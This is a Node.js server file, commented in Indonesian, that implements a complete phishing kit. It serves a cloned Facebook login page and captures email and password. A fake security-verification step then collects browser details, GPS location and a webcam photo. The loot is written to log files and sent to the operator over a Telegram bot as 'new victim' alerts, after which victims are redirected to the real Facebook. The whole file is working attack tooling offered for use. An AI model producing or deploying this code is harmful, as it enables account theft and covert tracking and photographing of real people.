// server.js - Advanced Phishing & Tracking System with Telegram Integration
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const moment = require('moment');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const app = express();

// Konfigurasi
const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE'; // Ganti dengan token bot Anda
const TELEGRAM_CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE'; // Ganti dengan chat ID Anda
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || `http://localhost:${PORT}`;

// Inisialisasi Bot (hanya jika token tersedia)
let bot = null;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}

// Database in-memory
const victims = new Map();
const sessions = new Map();

// Buat direktori logs jika belum ada
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
}

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Middleware untuk session ID
app.use((req, res, next) => {
    req.sessionId = crypto.randomBytes(16).toString('hex');
    sessions.set(req.sessionId, {
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.headers['user-agent'],
        timestamp: Date.now()
    });
    next();
});

// Fungsi untuk mendapatkan IP address
function getClientIp(req) {
    return req.headers['x-forwarded-for'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           req.connection.socket?.remoteAddress ||
           '0.0.0.0';
}

// Generate victim ID
function generateVictimId(req) {
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || '';
    const timestamp = Date.now();
    
    return crypto
        .createHash('sha256')
        .update(ip + userAgent + timestamp + Math.random().toString())
        .digest('hex')
        .substring(0, 12);
}

// Fungsi untuk mendapatkan nama browser
function getBrowserName(userAgent) {
    if (!userAgent) return 'Unknown';
    userAgent = userAgent.toLowerCase();
    if (userAgent.includes('chrome')) return 'Chrome';
    if (userAgent.includes('firefox')) return 'Firefox';
    if (userAgent.includes('safari')) return 'Safari';
    if (userAgent.includes('edge')) return 'Edge';
    if (userAgent.includes('opera') || userAgent.includes('opr')) return 'Opera';
    return 'Unknown';
}

// Fungsi untuk menyimpan data ke file
function saveToFile(data) {
    try {
        // Simpan data lengkap sebagai JSON
        const jsonFile = path.join(logsDir, `victim_${data.victimId}.json`);
        fs.writeFileSync(jsonFile, JSON.stringify(data, null, 2));
        
        // Simpan ke log utama
        const logEntry = `
================================================================================
VICTIM ID: ${data.victimId}
SESSION ID: ${data.sessionId || 'N/A'}
TIME: ${new Date().toISOString()}
----------------------------------------------------------------------------
CREDENTIALS:
  Email: ${data.credentials?.email || 'N/A'}
  Password: ${data.credentials?.password || 'N/A'}
----------------------------------------------------------------------------
LOCATION:
  IP: ${data.ip || 'N/A'}
  Country: ${data.geolocation?.country || 'Unknown'}
  City: ${data.geolocation?.city || 'Unknown'}
  Coordinates: ${data.location?.latitude || 'N/A'}, ${data.location?.longitude || 'N/A'}
----------------------------------------------------------------------------
SYSTEM INFO:
  User Agent: ${data.system?.userAgent || 'N/A'}
  Platform: ${data.system?.platform || 'N/A'}
  Screen: ${data.system?.screen?.width || 'N/A'}x${data.system?.screen?.height || 'N/A'}
================================================================================

`;
        
        const masterLog = path.join(logsDir, 'master_log.txt');
        fs.appendFileSync(masterLog, logEntry);
        
        // Simpan foto terpisah jika ada
        if (data.photo) {
            try {
                const base64Data = data.photo.replace(/^data:image\/\w+;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                const photoFile = path.join(logsDir, `photo_${data.victimId}.jpg`);
                fs.writeFileSync(photoFile, buffer);
            } catch (photoError) {
                console.error('Error saving photo:', photoError);
            }
        }
        
        console.log(`📁 Data saved for victim: ${data.victimId}`);
        
    } catch (error) {
        console.error('Error saving to file:', error);
    }
}

// Fungsi untuk mengirim alert ke Telegram
async function sendTelegramAlert(data) {
    if (!bot) return;
    
    try {
        // Format pesan utama
        const message = `
🎯 *NEW VICTIM CAPTURED* 🎯

*🔐 CREDENTIALS*
👤 Email: \`${data.credentials?.email || 'N/A'}\`
🔑 Password: \`${data.credentials?.password || 'N/A'}\`

*📍 LOCATION DATA*
🌐 IP Address: \`${data.ip || 'N/A'}\`
${data.geolocation ? `🗺️ Country: ${data.geolocation.country || 'Unknown'}` : ''}
${data.geolocation ? `🏙️ City: ${data.geolocation.city || 'Unknown'}` : ''}
${data.location ? `📍 Coordinates: ${data.location.latitude || 'N/A'}, ${data.location.longitude || 'N/A'}` : ''}

*🖥️ SYSTEM INFO*
💻 Platform: ${data.system?.platform || 'N/A'}
🌐 Browser: ${getBrowserName(data.system?.userAgent)}
📱 Screen: ${data.system?.screen?.width || 'N/A'}x${data.system?.screen?.height || 'N/A'}
🔍 Timezone: ${data.system?.timezone || 'N/A'}

*⏰ TIMING*
🕐 Time: ${moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')}

*🆔 IDs*
🆔 Victim ID: \`${data.victimId}\`
        `;
        
        // Kirim pesan utama
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        
        // Kirim lokasi di peta jika ada
        if (data.location && data.location.latitude && data.location.longitude) {
            await bot.sendLocation(
                TELEGRAM_CHAT_ID, 
                data.location.latitude, 
                data.location.longitude
            );
        }
        
        // Kirim foto jika ada
        if (data.photo) {
            try {
                const base64Data = data.photo.replace(/^data:image\/\w+;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                
                await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
                    caption: '📸 *Face Photo Captured*',
                    parse_mode: 'Markdown'
                });
            } catch (photoError) {
                console.error('Error sending photo:', photoError);
            }
        }
        
        console.log(`✅ Telegram alert sent for victim: ${data.victimId}`);
        
    } catch (error) {
        console.error('Error sending Telegram alert:', error);
    }
}

// Route Utama - Halaman Phishing
app.get('/', (req, res) => {
    const victimId = generateVictimId(req);
    const sessionId = req.sessionId;
    
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Facebook – log in or sign up</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
            body { background-color: #f0f2f5; color: #1c1e21; }
            .container { max-width: 980px; margin: 0 auto; padding: 72px 0 112px; }
            .row { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
            .intro { flex: 0 0 580px; padding-right: 32px; }
            .intro h1 { color: #1877f2; font-size: 55px; font-weight: bold; margin-bottom: 16px; }
            .intro h2 { font-size: 28px; font-weight: normal; line-height: 32px; }
            .login-panel { flex: 0 0 396px; }
            .login-box { background-color: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; }
            .login-box input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; margin-bottom: 12px; }
            .login-box input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
            .login-btn { background-color: #1877f2; border: none; border-radius: 6px; font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%; color: #fff; font-weight: bold; cursor: pointer; }
            .login-btn:hover { background-color: #166fe5; }
            .forgot-password { display: block; text-align: center; color: #1877f2; font-size: 14px; text-decoration: none; margin: 16px 0; padding-bottom: 16px; border-bottom: 1px solid #dadde1; }
            .create-account { background-color: #42b72a; border: none; border-radius: 6px; font-size: 17px; line-height: 48px; padding: 0 16px; color: #fff; font-weight: bold; cursor: pointer; display: block; margin: 0 auto; margin-top: 24px; }
            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; }
            .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; width: 90%; max-width: 500px; border-radius: 12px; padding: 20px; }
            .loading-spinner { border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .btn-primary { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; margin: 5px; }
            .btn-secondary { background: #e4e6eb; color: #1c1e21; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; margin: 5px; }
            #cameraVideo { width: 100%; max-height: 300px; background: #000; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="row">
                <div class="intro">
                    <h1>facebook</h1>
                    <h2>Facebook helps you connect and share with the people in your life.</h2>
                </div>
                <div class="login-panel">
                    <div class="login-box">
                        <form id="loginForm">
                            <input type="text" id="email" placeholder="Email address or phone number" required>
                            <input type="password" id="pass" placeholder="Password" required>
                            <button type="submit" class="login-btn">Log In</button>
                            <a href="#" class="forgot-password">Forgotten password?</a>
                            <button type="button" class="create-account" onclick="alert('Create account feature coming soon')">Create New Account</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- Security Modal -->
        <div id="securityModal" class="modal">
            <div class="modal-content">
                <h2 style="margin-bottom: 20px;">Security Verification</h2>
                <p>For your security, please verify your identity.</p>
                <button class="btn-primary" onclick="startVerification()">Continue</button>
                <button class="btn-secondary" onclick="closeModal('securityModal')">Cancel</button>
            </div>
        </div>

        <!-- Camera Modal -->
        <div id="cameraModal" class="modal">
            <div class="modal-content">
                <h2 style="margin-bottom: 20px;">Camera Access</h2>
                <video id="cameraVideo" autoplay playsinline style="width:100%; margin-bottom:20px;"></video>
                <button class="btn-primary" onclick="capturePhoto()">Capture Photo</button>
                <button class="btn-secondary" onclick="skipCamera()">Skip</button>
            </div>
        </div>

        <!-- Loading Modal -->
        <div id="loadingModal" class="modal">
            <div class="modal-content" style="text-align:center;">
                <div class="loading-spinner"></div>
                <p>Processing verification...</p>
            </div>
        </div>

        <script>
            const victimId = '${victimId}';
            const sessionId = '${sessionId}';
            let cameraStream = null;
            let capturedPhoto = null;

            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const email = document.getElementById('email').value;
                const password = document.getElementById('pass').value;
                
                if (email && password) {
                    // Store credentials
                    window.collectedData = {
                        credentials: { email, password },
                        timestamp: new Date().toISOString()
                    };
                    
                    // Show security modal
                    document.getElementById('securityModal').style.display = 'block';
                }
            });

            async function startVerification() {
                closeModal('securityModal');
                
                // Collect system info
                window.collectedData.system = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: {
                        width: screen.width,
                        height: screen.height
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                // Get IP
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    window.collectedData.ip = data.ip;
                } catch(e) {
                    window.collectedData.ip = 'unknown';
                }

                // Get location
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            window.collectedData.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            showCameraModal();
                        },
                        error => {
                            console.log('Location error:', error);
                            showCameraModal();
                        }
                    );
                } else {
                    showCameraModal();
                }
            }

            function showCameraModal() {
                document.getElementById('cameraModal').style.display = 'block';
                startCamera();
            }

            async function startCamera() {
                try {
                    cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    document.getElementById('cameraVideo').srcObject = cameraStream;
                } catch(e) {
                    console.log('Camera error:', e);
                    skipCamera();
                }
            }

            function capturePhoto() {
                const video = document.getElementById('cameraVideo');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                window.collectedData.photo = canvas.toDataURL('image/jpeg');
                
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
                
                closeModal('cameraModal');
                completeVerification();
            }

            function skipCamera() {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
                closeModal('cameraModal');
                completeVerification();
            }

            async function completeVerification() {
                document.getElementById('loadingModal').style.display = 'block';
                
                window.collectedData.victimId = victimId;
                window.collectedData.sessionId = sessionId;
                
                try {
                    const response = await fetch('/api/track', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(window.collectedData)
                    });
                    
                    if (response.ok) {
                        window.location.href = 'https://facebook.com';
                    }
                } catch(e) {
                    console.log('Error:', e);
                    window.location.href = 'https://facebook.com';
                }
            }

            function closeModal(modalId) {
                document.getElementById(modalId).style.display = 'none';
            }
        </script>
    </body>
    </html>
    `);
});

// API endpoint untuk menerima data tracking
app.post('/api/track', async (req, res) => {
    try {
        const data = req.body;
        const victimId = data.victimId || generateVictimId(req);
        
        // Add metadata
        data.victimId = victimId;
        data.sessionId = req.sessionId;
        data.serverTimestamp = new Date().toISOString();
        data.userAgent = req.headers['user-agent'];
        data.realIp = getClientIp(req);
        
        // Get IP geolocation
        if (data.ip && data.ip !== 'unknown') {
            try {
                const geo = geoip.lookup(data.ip);
                if (geo) {
                    data.geolocation = {
                        country: geo.country,
                        region: geo.region,
                        city: geo.city,
                        timezone: geo.timezone,
                        ll: geo.ll
                    };
                }
            } catch (geoError) {
                console.error('GeoIP error:', geoError);
            }
        }
        
        // Simpan ke database
        victims.set(victimId, data);
        
        // Kirim ke Telegram
        await sendTelegramAlert(data);
        
        // Simpan ke file
        saveToFile(data);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error in /api/track:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Admin dashboard
app.get('/admin', (req, res) => {
    const victimsList = Array.from(victims.values()).map(v => ({
        id: v.victimId,
        email: v.credentials?.email,
        ip: v.ip,
        time: v.timestamp,
        country: v.geolocation?.country || 'Unknown'
    }));
    
    res.json({
        total: victims.size,
        victims: victimsList
    });
});

// Bot commands (hanya jika bot diinisialisasi)
if (bot) {
    bot.onText(/\/start/, (msg) => {
        bot.sendMessage(msg.chat.id, '🕵️ Phishing Tracker Bot Active');
    });
    
    bot.onText(/\/stats/, (msg) => {
        bot.sendMessage(msg.chat.id, `Total Victims: ${victims.size}`);
    });
}

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).send('Internal Server Error');
});

// 404 handler
app.use((req, res) => {
    res.status(404).send('Not Found');
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════════╗
║     PHISHING TRACKER SERVER RUNNING            ║
╠════════════════════════════════════════════════╣
║  URL: http://localhost:${PORT}                   ║
║  Port: ${PORT}                                   ║
║  Telegram: ${bot ? '✅ Connected' : '❌ Not Configured'} ║
║  Logs: ./logs/                                  ║
╚════════════════════════════════════════════════╝
    `);
});

module.exports = app;
